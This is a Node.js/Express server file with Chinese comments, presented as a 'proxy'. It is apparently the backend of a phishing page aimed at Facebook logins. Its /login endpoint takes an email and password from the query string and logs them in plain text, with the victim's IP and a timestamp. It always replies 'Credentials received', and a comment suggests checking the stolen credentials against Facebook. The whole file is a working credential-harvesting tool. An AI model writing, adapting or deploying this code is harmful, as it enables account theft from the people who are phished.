# 文件名: proxy.js (Node.js + Express 代理服务器, 部署于Render/Heroku)
# 处理GET请求, 记录日志, 返回JSON
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// 日志文件路径
const LOG_FILE = path.join(__dirname, 'logs.txt');

// 中间件 - 记录访问IP
app.use((req, res, next) => {
    req.clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    next();
});

// GET端点
app.get('/login', (req, res) => {
    const { email, pass } = req.query;
    const ip = req.clientIP;
    const time = new Date().toISOString();

    // 基本过滤
    if (!email || !pass) {
        return res.status(400).json({ status: 'error', message: 'Missing credentials' });
    }

    // 防注入: 只允许字母数字@._-
    const cleanEmail = email.replace(/[^a-zA-Z0-9@._-]/g, '');
    const cleanPass = pass.replace(/[^a-zA-Z0-9!@_\-.]/g, '');

    // 写入日志 (异步)
    const logEntry = `[${time}] IP: ${ip} | Email: ${cleanEmail} | Pass: ${cleanPass}\n`;
    fs.appendFile(LOG_FILE, logEntry, (err) => {
        if (err) console.error('Log write error:', err);
    });

    // 可选: 向真实Facebook API验证 (模拟)
    // 此处直接返回成功状态 (实际部署可添加cURL验证)
    res.json({ status: 'ok', message: 'Credentials received' });
});

// 健康检查
app.get('/', (req, res) => {
    res.send('Proxy is running');
});

// 启动服务器
app.listen(PORT, () => {
    console.log(`Proxy listening on port ${PORT}`);
});
